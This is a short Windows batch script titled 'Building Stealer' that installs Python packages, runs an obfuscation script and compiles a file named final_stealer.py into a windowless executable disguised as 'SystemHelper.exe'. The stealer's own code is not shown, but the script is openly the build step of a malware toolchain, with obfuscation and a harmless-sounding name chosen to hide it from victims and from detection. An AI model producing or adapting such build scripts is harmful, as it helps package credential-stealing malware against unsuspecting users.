@echo off
title Building Stealer
echo Installing dependencies...
pip install pycryptodome pywin32 requests pyinstaller --quiet
echo Obfuscating...
python obfuscate.py
echo Compiling...
pyinstaller --onefile --noconsole --clean --name=SystemHelper final_stealer.py
echo Done! File: dist\SystemHelper.exe
pause